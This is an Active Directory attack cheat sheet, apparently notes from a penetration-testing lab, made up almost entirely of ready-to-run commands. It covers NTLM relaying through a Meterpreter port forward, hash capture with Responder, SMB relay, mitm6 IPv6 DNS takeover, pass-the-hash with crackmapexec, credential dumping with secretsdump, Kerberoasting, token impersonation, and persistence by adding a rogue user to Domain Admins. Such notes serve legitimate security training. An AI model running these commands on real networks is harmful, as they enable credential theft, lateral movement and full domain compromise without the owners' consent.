# Remote NTLM Relaying via Meterpreter
- On the victim machine
```powershell
sc stop netlogon
sc stop lanmanserver
sc config lanmanserver start= disabled
sc stop lanmanworkstation
sc config lanmanworkstation start= disabled
```
- In the Meterpreter session
```powershell
portfwd add -R -L 0.0.0.0 -l 445 -p 445
```
- On ntlmrelayx
```powershell
ntlmrelayx.py -t smb://10.200.69.30 -smb2support
```
# Capturing hashes using RESPONDER
```bash
 sudo responder -I tun0 -dwPv
```
# SMB Relay 
> SMB signing must be disabled
Scan host without smb signing
```bash
nmap --script=smb2-security-mode.nse -p445 192.168.107.186 -Pn
```
- Turn off smb and http from **Responder.conf** file
- Run Responder
```bash
sudo responder -I tun0 -rdw -v
```
- Setup another tool `ntlmrelayx.py`
```bash
ntlmrelayx.py -tf <target file> -smb2support
```
# IPv6 DNS Takeover via mitm6 & ntlmrelayx
- Set up ntlmrelayx.
```bash
ntlmrelayx.py -6 -t ldaps://<target IP> -wh fakepad.marvel.local -l lootme
```
- Setup MITM6.
```bash
sudo mitm6 -d <domain name>
```
On successful it will create a lootme folder in the local machine with a bunch of information.

# Pass Attacks
- Using **Crackmapexec smb**
```bash
crackmapexec smb xxx.xxx.xxx.0/24 -u <uname> -d <domain> -p <password>

crackmapexec smb xxx.xxx.xxx.0/24 -u <uname> -d <domain> -H <hash> --local-auth
```
# Dumping and Cracking hashes
- using **secretsdump**
```bash
secretsdump.py <domain>/<user>:<password>@<target IP>

secretsdump.py <user>:@<IP> -hashes <hash>
```
# Kerberosting
- Using **GetUserSPNs**
```bash
sudo GetUserSPNs.py <domain>/<user>:<password> -dc-ip <IP> -request
```
# Token Impersonation
- Using **Metasploit**
```bash
meterpreter> load incognito
meterpreter> list tokens -u
meterpreter> impersonate_token <token name>
```
- Next for persistence, we can add new user and run secretsdump.
```bash
meterpreter> net user /add badboy password123 /DOMAIN
meterpreter> net group "Domain Admins" badboy /ADD /DOMAIN


secretsdump.py <Domain>/badboy:'password123'@<IP>
```
